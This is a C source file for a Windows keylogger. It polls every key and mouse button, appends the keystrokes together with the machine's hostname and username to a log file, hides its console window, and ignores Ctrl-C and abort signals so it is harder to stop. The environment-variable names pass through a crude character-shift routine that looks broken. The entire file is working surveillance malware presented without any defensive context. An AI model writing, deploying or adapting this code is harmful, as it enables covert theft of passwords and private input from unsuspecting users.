#include <stdio.h>
#include <Windows.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <ctype.h>
#include <signal.h>

char logname[] = "keylogger.log";

char *CurrentTime()
{
    char *localtm = (char *)malloc(1024);
    SYSTEMTIME localt;

    GetLocalTime(&localt);

    snprintf(localtm, 1024, "%02d:%02d %02d/%02d/%04d", localt.wHour, localt.wMinute, localt.wDay, localt.wMonth, localt.wYear);
    return localtm;
}

char *shift_64(char *s)
{
    for (int i = 0; i < strlen(s); i++)
    {
        if (s[i] != ' ')
        {
            s[i] += 64;
        }
    }
    return s;
}

char *upperstr(char *s)
{
    for (int i = 0; i < strlen(s); i++)
    {
        s[i] = toupper(s[i]);
    }
    return s;
}

int main(int argc, char *argv[])
{
    char click[] = "#,)#+=";
    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode;
    GetConsoleMode(hStdout, &dwMode);
    // Disable Control-C closing
    SetConsoleMode(hStdout, dwMode & ~ENABLE_PROCESSED_INPUT);
    signal(SIGINT, SIG_IGN);  // Control-C handling
    signal(SIGABRT, SIG_IGN); // Control-Break handling

    FILE *fileptr = fopen(logname, "ab");
    char *username = (char *)malloc(1024);
    char *hostname = (char *)malloc(1024);
    username = getenv(shift_64("username"));
    hostname = getenv(shift_64("computername"));

    if (!fileptr)
    {
        perror("Error opening file");
        return EXIT_FAILURE;
    }
    fprintf(fileptr, "\n[Logger started at %s (Hostname: %s, Usernames: %s)]\n", CurrentTime(), hostname, username);

    fclose(fileptr);

    int isCaps = false;
    int printConsole = true;
    int hideConsole = true;
    if (hideConsole)
    {
        FreeConsole();
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    }
    unsigned char key;
    while (1)
    {
        for (key = 8; key <= 255; key++)
        {
            if (GetAsyncKeyState(key) & 0x01)
            {
                fileptr = fopen(logname, "ab");
                isCaps = 0;
                if (GetKeyState(VK_CAPITAL) < 0)
                {
                    isCaps = !isCaps;
                }
                if (GetKeyState(VK_SHIFT) < 0)
                {
                    isCaps = !isCaps;
                }

                isCaps ? (key = toupper(key)) : (key = tolower(key));

                if (isprint(key) || isspace(key) || isalnum(key) || (key <= 8 && key != 7) || (key >= 0x23 && key <= 0x2E) || (key >= 0x11 || key <= 0x13))
                {
                    switch (key)
                    {
                    case VK_LBUTTON:
                        fprintf(fileptr, "{LEFT_CLICK}");
                        break;
                    case VK_RBUTTON:
                        fprintf(fileptr, "{RIGHT_CLICK}");
                        break;
                    case VK_MBUTTON:
                        fprintf(fileptr, "{MIDDLE_CLICK}");
                        break;
                    case VK_XBUTTON1:
                        fprintf(fileptr, "{X1_CLICK}");
                        break;
                    case VK_XBUTTON2:
                        fprintf(fileptr, "{X2_CLICK}");
                        break;
                    case VK_BACK:
                        fprintf(fileptr, "{BACKSPACE}");
                        break;
                    default:
                        putc(key, fileptr);
                        break;
                    }
                    if (printConsole)
                    {
                        putchar(key);
                    }
                }
                fclose(fileptr);
            }
        }
    }
    fclose(fileptr);
    return EXIT_SUCCESS;
}
